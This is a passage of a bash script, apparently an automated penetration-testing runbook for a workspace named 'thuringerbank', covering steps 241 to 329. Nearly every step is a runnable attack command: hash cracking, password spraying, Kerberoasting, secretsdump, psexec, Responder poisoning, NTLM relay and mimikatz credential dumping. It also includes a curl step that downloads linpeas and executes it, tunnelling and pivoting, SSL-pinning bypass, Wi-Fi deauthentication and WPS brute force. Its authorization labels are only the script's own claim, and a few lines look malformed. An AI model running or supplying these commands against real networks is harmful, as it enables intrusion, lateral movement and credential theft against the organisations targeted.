if [ "$DRY_RUN" = "1" ]; then
  skip '241. Identify the hash types you obtained'
else
  { hashid -m -j ~/BugX/thuringerbank/04_evidence/hashes.txt | tee ~/BugX/thuringerbank/03_exploits/hashid.txt ; } 2>&1 | tee -a "$LOG"
fi

# 242. Offline hash cracking with rules  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '242. Offline hash cracking with rules'
else
  { john --format=raw-md5 --wordlist=/usr/share/wordlists/dirb/common.txt --rules --fork=5 ~/BugX/thuringerbank/04_evidence/hashes.txt ; } 2>&1 | tee -a "$LOG"
fi

# 243. GPU cracking with the mode hashid reported  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '243. GPU cracking with the mode hashid reported'
else
  { hashcat -m 1000 -a 0 -O -w 3 --potfile-path=~/BugX/thuringerbank/03_exploits/hashcat.pot ~/BugX/thuringerbank/04_evidence/hashes.txt /usr/share/wordlists/dirb/common.txt -r /usr/share/hashcat/rules/best64.rule ; } 2>&1 | tee -a "$LOG"
fi

# 244. Service-aware credential testing from scan output  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '244. Service-aware credential testing from scan output'
else
  { brutespray --file ~/BugX/thuringerbank/02_scanning/nmap_top1000.gnmap -U ~/BugX/thuringerbank/01_recon/users.txt -P /usr/share/wordlists/dirb/common.txt -t 4 --hosts 1 --passwords 1 --threads 1 ; } 2>&1 | tee -a "$LOG"
fi

# 245. Password spraying with lockout throttling  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '245. Password spraying with lockout throttling'
else
  { spray.sh -spray spray.sh 2>/dev/null || python3 spray.py -t yourtarget.com -u ~/BugX/thuringerbank/01_recon/users.txt -p ~/BugX/thuringerbank/05_reports/spray_passwords.txt --lockout 5 --throttle 1800 --delay 2 ; } 2>&1 | tee -a "$LOG"
fi

# 246. SSH algorithm and configuration review  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '246. SSH algorithm and configuration review'
else
  { ssh-audit -b -j yourtarget.com > ~/BugX/thuringerbank/02_scanning/ssh_audit.json; head -c 600 ~/BugX/thuringerbank/02_scanning/ssh_audit.json ; } 2>&1 | tee -a "$LOG"
fi

# 247. Windows credential recovery workflow  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '247. Windows credential recovery workflow'
else
  { echo "Cain & Abel: run on a Windows analysis host you own, import the captured hashes, use the Cryptanalysis tab. Never install it on a production system." ; } 2>&1 | tee -a "$LOG"
fi

# 248. Commercial forensic password recovery  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '248. Commercial forensic password recovery'
else
  { echo "Passware Kit: licensed host only. Import the container or hash file, choose the attack profile, export the recovery audit log." ; } 2>&1 | tee -a "$LOG"
fi

# 249. Domain-wide credential validation (authorized AD test)  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '249. Domain-wide credential validation (authorized AD test)'
else
  { nxc smb yourtarget.com -u "$BS_USER" -p "$BS_PASS" --continue-on-success --threads 2 ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Windows, SMB & Active Directory
note '[Windows, SMB & Active Directory] light per host — LDAP and SMB enumeration at 5 threads'

# 250. Full SMB, RPC and policy enumeration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '250. Full SMB, RPC and policy enumeration'
else
  { enum4linux -a -u "$BS_USER" -p "$BS_PASS" yourtarget.com | tee ~/BugX/thuringerbank/02_scanning/enum4linux.txt | tail -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 251. NetBIOS and SMB host survey  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '251. NetBIOS and SMB host survey'
else
  { nbtscan -v $BS_CIDR | tee ~/BugX/thuringerbank/02_scanning/nbtscan_verbose.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 252. Map share permissions across hosts  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '252. Map share permissions across hosts'
else
  { smbmap -H yourtarget.com -u "$BS_USER" -p "$BS_PASS" -R --depth 2 | tee ~/BugX/thuringerbank/02_scanning/smbmap.txt | head -n 50 ; } 2>&1 | tee -a "$LOG"
fi

# 253. List and mount shares  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '253. List and mount shares'
else
  { smbclient -L //yourtarget.com/ -U "$BS_USER%$BS_PASS" -m SMB3 | tee ~/BugX/thuringerbank/02_scanning/smbclient_list.txt ; } 2>&1 | tee -a "$LOG"
fi

# 254. RPC enumeration of users, groups and shares  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '254. RPC enumeration of users, groups and shares'
else
  { rpcclient -U "$BS_USER%$BS_PASS" yourtarget.com -c 'enumdomusers;enumdomgroups;enumdomains;netshareenum;querydominfo' | tee ~/BugX/thuringerbank/02_scanning/rpcclient.txt | head -n 50 ; } 2>&1 | tee -a "$LOG"
fi

# 255. Directory enumeration over LDAP  (authorized-active)
# PREREQUISITE: export BS_DN and BS_BASE_DN for the domain you are authorized to query
if [ "$DRY_RUN" = "1" ]; then
  skip '255. Directory enumeration over LDAP'
else
  { ldapsearch -x -H ldap://yourtarget.com -D "$BS_DN" -w "$BS_PASS" -b "$BS_BASE_DN" '(objectClass=user)' sAMAccountName mail memberOf lastLogonTimestamp pwdLastSet | tee ~/BugX/thuringerbank/02_scanning/ldap_users.txt | head -n 60 ; } 2>&1 | tee -a "$LOG"
fi

# 256. Targeted AD queries  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '256. Targeted AD queries'
else
  { windapsearch -d DOMAIN --dc yourtarget.com -u "$BS_USER" -p "$BS_PASS" --da --unconstrained-users --admin-objects | tee ~/BugX/thuringerbank/02_scanning/windapsearch.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 257. Collect AD relationships for attack-path analysis  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '257. Collect AD relationships for attack-path analysis'
else
  { bloodhound-python -u "$BS_USER" -p "$BS_PASS" -d DOMAIN -ns yourtarget.com -c All --zip -o ~/BugX/thuringerbank/03_exploits/bloodhound ; } 2>&1 | tee -a "$LOG"
fi

# 258. Windows-side collector for the same graph  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '258. Windows-side collector for the same graph'
else
  { SharpHound.exe -c All --zipfilename ~/BugX/thuringerbank/03_exploits/sharphound.zip ; } 2>&1 | tee -a "$LOG"
fi

# 259. Kerberos user enumeration  (authorized-active)
# PREREQUISITE: a username list in $WS/01_recon/users.txt
if [ "$DRY_RUN" = "1" ]; then
  skip '259. Kerberos user enumeration'
else
  { kerbrute userenum -d DOMAIN --dc yourtarget.com ~/BugX/thuringerbank/01_recon/users.txt -t 5 -o ~/BugX/thuringerbank/02_scanning/kerbrute.txt ; } 2>&1 | tee -a "$LOG"
fi

# 260. AS-REP roasting check  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '260. AS-REP roasting check'
else
  { impacket-GetNPUsers DOMAIN/ -dc-ip yourtarget.com -usersfile ~/BugX/thuringerbank/01_recon/users.txt -format hashcat -outputfile ~/BugX/thuringerbank/03_exploits/asrep.txt ; } 2>&1 | tee -a "$LOG"
fi

# 261. Kerberoasting: request service tickets  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '261. Kerberoasting: request service tickets'
else
  { impacket-GetUserSPNs DOMAIN/"$BS_USER":"$BS_PASS" -dc-ip yourtarget.com -request -outputfile ~/BugX/thuringerbank/03_exploits/kerberoast.txt ; } 2>&1 | tee -a "$LOG"
fi

# 262. Dump credential material from a host you own the rights to  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '262. Dump credential material from a host you own the rights to'
else
  { impacket-secretsdump DOMAIN/"$BS_USER":"$BS_PASS"@yourtarget.com -outputfile ~/BugX/thuringerbank/04_evidence/secretsdump ; } 2>&1 | tee -a "$LOG"
fi

# 263. Remote execution with a validated credential  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '263. Remote execution with a validated credential'
else
  { impacket-psexec DOMAIN/"$BS_USER":"$BS_PASS"@yourtarget.com -codec utf-8 ; } 2>&1 | tee -a "$LOG"
fi

# 264. Validate credentials across the estate  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '264. Validate credentials across the estate'
else
  { nxc smb $BS_CIDR -u "$BS_USER" -p "$BS_PASS" --continue-on-success --threads 4 -o ~/BugX/thuringerbank/03_exploits/nxc_smb.txt ; } 2>&1 | tee -a "$LOG"
fi

# 265. Check signing, SMBv1 and relay exposure  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '265. Check signing, SMBv1 and relay exposure'
else
  { nxc smb $BS_CIDR --gen-relay-list ~/BugX/thuringerbank/03_exploits/relay_targets.txt --threads 4 ; } 2>&1 | tee -a "$LOG"
fi

# 266. Name-resolution poisoning on an authorized segment  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '266. Name-resolution poisoning on an authorized segment'
else
  { sudo responder -I eth0 -wv -d -F -o -v ; } 2>&1 | tee -a "$LOG"
fi

# 267. NTLM relay against a non-signing host  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '267. NTLM relay against a non-signing host'
else
  { impacket-ntlmrelayx -tf ~/BugX/thuringerbank/03_exploits/relay_targets.txt -smb2support -socks -of ~/BugX/thuringerbank/04_evidence/relay.log ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Privilege escalation, tunnels & pivoting
note '[Privilege escalation, tunnels & pivoting] light per host — the enumeration scripts are the slow part'

# 268. Linux privilege-escalation enumeration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '268. Linux privilege-escalation enumeration'
else
  { curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh -a | tee ~/BugX/thuringerbank/04_evidence/linpeas.txt | tail -n 60 ; } 2>&1 | tee -a "$LOG"
fi

# 269. Windows privilege-escalation enumeration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '269. Windows privilege-escalation enumeration'
else
  { winPEASx64.exe quiet log=~/BugX/thuringerbank/04_evidence/winpeas.txt ; } 2>&1 | tee -a "$LOG"
fi

# 270. Host situational awareness  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '270. Host situational awareness'
else
  { Seatbelt.exe -group=all -outputfile=~/BugX/thuringerbank/04_evidence/seatbelt.txt ; } 2>&1 | tee -a "$LOG"
fi

# 271. Windows privilege-escalation audit  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '271. Windows privilege-escalation audit'
else
  { SharpUp.exe audit ; } 2>&1 | tee -a "$LOG"
fi

# 272. Unix privilege-escalation check  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '272. Unix privilege-escalation check'
else
  { ./unix-privesc-check standard > ~/BugX/thuringerbank/04_evidence/unix_privesc.txt 2>&1; tail -n 40 ~/BugX/thuringerbank/04_evidence/unix_privesc.txt ; } 2>&1 | tee -a "$LOG"
fi

# 273. Linux Exploit Suggester  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '273. Linux Exploit Suggester'
else
  { ./linux-exploit-suggester.sh --uname "$(uname -r)" -k 4.4.0 -o ~/BugX/thuringerbank/04_evidence/les.txt | tail -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# 274. Credential material extraction on an owned host  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '274. Credential material extraction on an owned host'
else
  { mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > ~/BugX/thuringerbank/04_evidence/mimikatz.txt ; } 2>&1 | tee -a "$LOG"
fi

# 275. PowerShell reconnaissance modules  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '275. PowerShell reconnaissance modules'
else
  { powershell -ep bypass -c "Import-Module .\PowerView.ps1; Get-NetUser | select samaccountname,description | Export-Csv ~/BugX/thuringerbank\04_evidence\powerview_users.csv" ; } 2>&1 | tee -a "$LOG"
fi

# 276. WMI and SMB execution alternatives  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '276. WMI and SMB execution alternatives'
else
  { impacket-wmiexec DOMAIN/"$BS_USER":"$BS_PASS"@yourtarget.com "whoami /all" ; } 2>&1 | tee -a "$LOG"
fi

# 277. TCP tunnel over HTTP  (opt-in heavy)
# PREREQUISITE: authorization for internal pivoting
if [ "$DRY_RUN" = "1" ]; then
  skip '277. TCP tunnel over HTTP'
else
  { chisel server -p 8080 --reverse --auth "bs:$BS_PASS" & sleep 2; echo "on the target: chisel client yourtarget.com:8080 R:socks" ; } 2>&1 | tee -a "$LOG"
fi

# 278. Reverse tunnel with a routed interface  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '278. Reverse tunnel with a routed interface'
else
  { sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up; ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601 ; } 2>&1 | tee -a "$LOG"
fi

# 279. Transparent VPN over SSH  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '279. Transparent VPN over SSH'
else
  { sshuttle -r "$BS_USER@yourtarget.com" $BS_CIDR --dns --auto-hosts ; } 2>&1 | tee -a "$LOG"
fi

# 280. Port relay for a single service  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '280. Port relay for a single service'
else
  { socat TCP-LISTEN:8443,fork,reuseaddr TCP:yourtarget.com:443 ; } 2>&1 | tee -a "$LOG"
fi

# 281. Route tools through the pivot  (opt-in heavy)
# PREREQUISITE: export BS_INTERNAL_HOST and a working tunnel
if [ "$DRY_RUN" = "1" ]; then
  skip '281. Route tools through the pivot'
else
  { proxychains4 -q -f /etc/proxychains4.conf nmap -sT -Pn -p $BS_PORTS "$BS_INTERNAL_HOST" ; } 2>&1 | tee -a "$LOG"
fi

# 282. Local port forward for a management interface  (opt-in heavy)
# PREREQUISITE: export BS_PIVOT and confirm the jump host is in scope
if [ "$DRY_RUN" = "1" ]; then
  skip '282. Local port forward for a management interface'
else
  { ssh -N -L 127.0.0.1:9443:yourtarget.com:443 "$BS_USER@$BS_PIVOT" ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Mobile application testing (Android & iOS)
note '[Mobile application testing (Android & iOS)] static analysis is local and fast; dynamic instrumentation is interactive'

# 283. Enumerate connected devices and emulator  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '283. Enumerate connected devices and emulator'
else
  { adb devices -l; adb shell getprop ro.build.version.release; adb shell getprop ro.product.model ; } 2>&1 | tee -a "$LOG"
fi

# 284. Decode the APK into readable resources  (authorized-active)
# PREREQUISITE: place the target APK in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '284. Decode the APK into readable resources'
else
  { apktool d -f -o ~/BugX/thuringerbank/artifacts/app_decoded ~/BugX/thuringerbank/artifacts/app.apk ; } 2>&1 | tee -a "$LOG"
fi

# 285. Read the binary manifest directly  (authorized-active)
# PREREQUISITE: place the target APK in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '285. Read the binary manifest directly'
else
  { java -jar AXMLPrinter2.jar ~/BugX/thuringerbank/artifacts/app.apk > ~/BugX/thuringerbank/artifacts/manifest.xml; grep -E 'android:(exported|permission|name|scheme)' ~/BugX/thuringerbank/artifacts/manifest.xml | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 286. Decompile DEX to Java  (authorized-active)
# PREREQUISITE: place the target APK in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '286. Decompile DEX to Java'
else
  { jadx -d ~/BugX/thuringerbank/artifacts/app_src --show-bad-code --threads-count 5 ~/BugX/thuringerbank/artifacts/app.apk ; } 2>&1 | tee -a "$LOG"
fi

# 287. Convert DEX to JAR for a Java decompiler  (authorized-active)
# PREREQUISITE: place the target APK in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '287. Convert DEX to JAR for a Java decompiler'
else
  { d2j-dex2jar.sh -f -o ~/BugX/thuringerbank/artifacts/app.jar ~/BugX/thuringerbank/artifacts/app.apk; jd-cli ~/BugX/thuringerbank/artifacts/app.jar -od ~/BugX/thuringerbank/artifacts/jd_src ; } 2>&1 | tee -a "$LOG"
fi

# 288. Programmatic APK analysis  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '288. Programmatic APK analysis'
else
  { androguard analyze -i ~/BugX/thuringerbank/artifacts/app.apk -o ~/BugX/thuringerbank/artifacts/androguard.json --output-format json ; } 2>&1 | tee -a "$LOG"
fi

# 289. Secret discovery inside the package  (authorized-active)
# PREREQUISITE: place the target APK in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '289. Secret discovery inside the package'
else
  { apkleaks -f ~/BugX/thuringerbank/artifacts/app.apk -o ~/BugX/thuringerbank/04_evidence/apkleaks.txt ; } 2>&1 | tee -a "$LOG"
fi

# 290. Package metadata from the Android SDK  (authorized-active)
# PREREQUISITE: place the target APK in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '290. Package metadata from the Android SDK'
else
  { apkanalyzer manifest print ~/BugX/thuringerbank/artifacts/app.apk | head -n 60; apkanalyzer apk summary ~/BugX/thuringerbank/artifacts/app.apk ; } 2>&1 | tee -a "$LOG"
fi

# 291. Verify the signing configuration  (authorized-active)
# PREREQUISITE: place the target APK in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '291. Verify the signing configuration'
else
  { apksigner verify --print-certs --verbose ~/BugX/thuringerbank/artifacts/app.apk | head -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# 292. Enumerate the attack surface  (authorized-active)
# PREREQUISITE: the app installed on a device with drozer running
if [ "$DRY_RUN" = "1" ]; then
  skip '292. Enumerate the attack surface'
else
  { drozer console connect -c "run app.package.list -f target" -c "run app.package.attacksurface com.target.app" -c "run app.package.info -a com.target.app" ; } 2>&1 | tee -a "$LOG"
fi

# 293. Provider SQL injection and path traversal  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '293. Provider SQL injection and path traversal'
else
  { drozer console connect -c "run scanner.provider.injection -a com.target.app" -c "run scanner.provider.traversal -a com.target.app" ; } 2>&1 | tee -a "$LOG"
fi

# 294. Runtime exploration with the app running  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '294. Runtime exploration with the app running'
else
  { objection -g com.target.app explore -s "android sslpinning disable" -s "android root disable" -s "env" ; } 2>&1 | tee -a "$LOG"
fi

# 295. Attach to the running process  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '295. Attach to the running process'
else
  { frida-ps -U | grep -i target; frida -U -f com.target.app -l ~/BugX/thuringerbank/scripts/hook.js --no-pause ; } 2>&1 | tee -a "$LOG"
fi

# 296. Automated static and dynamic analysis  (authorized-active)
# PREREQUISITE: place the target APK in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '296. Automated static and dynamic analysis'
else
  { docker run -it --rm -p 8000:8000 -v ~/BugX/thuringerbank/artifacts:/home/mobsf/.MobSF/uploads opensecurity/mobile-security-framework-mobsf:latest ; } 2>&1 | tee -a "$LOG"
fi

# 297. Intercept the app's API traffic  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '297. Intercept the app'\''s API traffic'
else
  { mitmproxy --mode regular --listen-port 8080 --save-stream-file ~/BugX/thuringerbank/04_evidence/mobile_flows.dump -w ; } 2>&1 | tee -a "$LOG"
fi

# 298. iOS device information  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '298. iOS device information'
else
  { ideviceinfo -k ProductVersion; ideviceinfo -k ProductType; idevice_id -l ; } 2>&1 | tee -a "$LOG"
fi

# 299. Dump Objective-C interfaces from an IPA  (authorized-active)
# PREREQUISITE: place the decrypted IPA in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '299. Dump Objective-C interfaces from an IPA'
else
  { class-dump-z -H ~/BugX/thuringerbank/artifacts/app_payload/Payload/App.app -o ~/BugX/thuringerbank/artifacts/headers ; } 2>&1 | tee -a "$LOG"
fi

# 300. iOS runtime inspection  (authorized-active)
# PREREQUISITE: a jailbroken device with the app running
if [ "$DRY_RUN" = "1" ]; then
  skip '300. iOS runtime inspection'
else
  { cycript -p AppName -e 'UIApp.keyWindow.recursiveDescription().toString()' ; } 2>&1 | tee -a "$LOG"
fi

# 301. Browse the app's on-device storage  (authorized-active)
# PREREQUISITE: a test device you own
if [ "$DRY_RUN" = "1" ]; then
  skip '301. Browse the app'\''s on-device storage'
else
  { echo "iFunBox: connect the test device, open the app's container, copy the Documents and Library directories for offline review." ; } 2>&1 | tee -a "$LOG"
fi

# 302. Test the API surface the app revealed  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '302. Test the API surface the app revealed'
else
  { nuclei -u https://yourtarget.com -tags exposure,misconfig,api -rate-limit 10 -jsonl -o ~/BugX/thuringerbank/03_exploits/nuclei_mobileapi.jsonl | tail -n 15 ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Thick client, binary & desktop review
note '[Thick client, binary & desktop review] interactive work — the analysis is manual once the tooling is attached'

# 303. Intercept a thick client's traffic  (authorized-active)
# PREREQUISITE: place the client installer on your analysis host in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '303. Intercept a thick client'\''s traffic'
else
  { echo "Echo Mirage: start it, choose the client process, start the agent, then launch the app. All TCP goes through the hook." ; } 2>&1 | tee -a "$LOG"
fi

# 304. Proxy a client that respects system proxy settings  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '304. Proxy a client that respects system proxy settings'
else
  { mitmproxy --mode regular --listen-port 8080 --save-stream-file ~/BugX/thuringerbank/04_evidence/thick_flows.dump -w ; } 2>&1 | tee -a "$LOG"
fi

# 305. Decompile the .NET client  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '305. Decompile the .NET client'
else
  { echo "ILSpy: open the assembly, inspect the network and crypto namespaces, export the project to CSV/source for review." ; } 2>&1 | tee -a "$LOG"
fi

# 306. Debug and patch the .NET client locally  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '306. Debug and patch the .NET client locally'
else
  { echo "dnSpy: open the assembly, set a breakpoint on the authorization method, run, and step through with your own test credentials." ; } 2>&1 | tee -a "$LOG"
fi

# 307. Debug a native client  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '307. Debug a native client'
else
  { echo "x64dbg: open the binary, break on the licence or feature check, inspect the comparison, and note the exact branch." ; } 2>&1 | tee -a "$LOG"
fi

# 308. Enable disabled UI controls during testing  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '308. Enable disabled UI controls during testing'
else
  { echo "Windows Enabler: toggle the control you want active in the client window, then exercise the flow with your own data." ; } 2>&1 | tee -a "$LOG"
fi

# 309. Inspect the client's handles and memory  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '309. Inspect the client'\''s handles and memory'
else
  { echo "Process Explorer: open the client process, inspect handles, loaded modules and strings for paths and tokens." ; } 2>&1 | tee -a "$LOG"
fi

# 310. Verify binary signatures and versions  (authorized-active)
# PREREQUISITE: a Windows analysis host
if [ "$DRY_RUN" = "1" ]; then
  skip '310. Verify binary signatures and versions'
else
  { sigcheck -a -h -e -q "C:\\Program Files\\Target" 2>&1 | tee ~/BugX/thuringerbank/02_scanning/sigcheck.txt ; } 2>&1 | tee -a "$LOG"
fi

# 311. Watch file, registry and process activity  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '311. Watch file, registry and process activity'
else
  { echo "Process Monitor: capture with a filter on the client's process name, then exercise the update and login flows and inspect the file/registry operations." ; } 2>&1 | tee -a "$LOG"
fi

# 312. Hex-level review of a client artefact  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '312. Hex-level review of a client artefact'
else
  { echo "WinHex: open the client's config or memory dump, search for credentials and tokens, document the offset of anything sensitive." ; } 2>&1 | tee -a "$LOG"
fi

# 313. Extract strings and obfuscated strings from a binary  (authorized-active)
# PREREQUISITE: place the client binary in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '313. Extract strings and obfuscated strings from a binary'
else
  { floss -q ~/BugX/thuringerbank/artifacts/client.exe | tee ~/BugX/thuringerbank/02_scanning/floss_strings.txt | head -n 60 ; } 2>&1 | tee -a "$LOG"
fi

# 314. Fast string pass over the artefact  (authorized-active)
# PREREQUISITE: place the client binary in $WS/artifacts/ before running this
if [ "$DRY_RUN" = "1" ]; then
  skip '314. Fast string pass over the artefact'
else
  { strings -n 8 ~/BugX/thuringerbank/artifacts/client.exe | grep -Ei 'https?://|api[_-]?key|password|secret|token' | sort -u | tee ~/BugX/thuringerbank/02_scanning/strings_candidates.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 315. Capture and dissect the client's own protocol  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '315. Capture and dissect the client'\''s own protocol'
else
  { sudo tshark -i eth0 -f "host $BS_SERVER" -w ~/BugX/thuringerbank/04_evidence/client_traffic.pcap -a duration:120 ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Wireless, Bluetooth & RF auditing
note '[Wireless, Bluetooth & RF auditing] per-interface timing — deauth and cracking steps need an approved window'

# 316. Put the adapter into monitor mode  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '316. Put the adapter into monitor mode'
else
  { sudo airmon-ng check kill; sudo airmon-ng start wlan0; iwconfig | head -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 317. Survey the airspace  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '317. Survey the airspace'
else
  { sudo airodump-ng --band abg --write-interval 5 -w ~/BugX/thuringerbank/02_scanning/survey $BS_IFACE ; } 2>&1 | tee -a "$LOG"
fi

# 318. Focused capture on one access point  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '318. Focused capture on one access point'
else
  { sudo airodump-ng --bssid $BS_BSSID -c $BS_CHANNEL --write ~/BugX/thuringerbank/04_evidence/capture_$BS_BSSID $BS_IFACE ; } 2>&1 | tee -a "$LOG"
fi

# 319. Trigger a re-authentication to capture a handshake  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '319. Trigger a re-authentication to capture a handshake'
else
  { sudo aireplay-ng --deauth 3 -a $BS_BSSID -c $BS_CLIENT $BS_IFACE ; } 2>&1 | tee -a "$LOG"
fi

# 320. Crack the captured handshake offline  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '320. Crack the captured handshake offline'
else
  { aircrack-ng -w $BS_WORDLIST -b $BS_BSSID ~/BugX/thuringerbank/04_evidence/capture_$BS_BSSID*.cap ; } 2>&1 | tee -a "$LOG"
fi

# 321. Decrypt a capture once you hold the key  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '321. Decrypt a capture once you hold the key'
else
  { airdecap-ng -p "$BS_PSK" -e $BS_SSID -b $BS_BSSID ~/BugX/thuringerbank/04_evidence/capture_$BS_BSSID*.cap ; } 2>&1 | tee -a "$LOG"
fi

# 322. WPS PIN testing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '322. WPS PIN testing'
else
  { sudo reaver -i $BS_IFACE -b $BS_BSSID -c $BS_CHANNEL -vv -L -N -d 2 -T 5 -t 3 ; } 2>&1 | tee -a "$LOG"
fi

# 323. Alternative WPS brute force  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '323. Alternative WPS brute force'
else
  { sudo bully -b $BS_BSSID -c $BS_CHANNEL -d -v 3 $BS_IFACE ; } 2>&1 | tee -a "$LOG"
fi

# 324. Offline WPS PIN recovery  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '324. Offline WPS PIN recovery'
else
  { pixiewps -e $BS_PKE -r $BS_PKR -s $BS_EHASH1 -z $BS_EHASH2 -a $BS_AUTHKEY ; } 2>&1 | tee -a "$LOG"
fi

# 325. Automated wireless audit run  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '325. Automated wireless audit run'
else
  { sudo wifite --kill --wps --no-wps-pixie --wpa --dict $BS_WORDLIST --bssid $BS_BSSID --nodeauths ; } 2>&1 | tee -a "$LOG"
fi

# 326. Enterprise wireless credential capture in an approved test  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '326. Enterprise wireless credential capture in an approved test'
else
  { sudo hostapd-wpe ~/BugX/thuringerbank/scripts/hostapd-wpe.conf -dd ; } 2>&1 | tee -a "$LOG"
fi

# 327. WPA-PSK dictionary verification  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '327. WPA-PSK dictionary verification'
else
  { cowpatty -r ~/BugX/thuringerbank/04_evidence/capture_$BS_BSSID.cap -f $BS_WORDLIST -s $BS_SSID ; } 2>&1 | tee -a "$LOG"
fi

# 328. LEAP and MS-CHAPv2 analysis  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '328. LEAP and MS-CHAPv2 analysis'
else
  { asleap -r ~/BugX/thuringerbank/04_evidence/capture.pcap -W $BS_WORDLIST ; } 2>&1 | tee -a "$LOG"
fi

# 329. EAP-MD5 credential analysis  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '329. EAP-MD5 credential analysis'
else
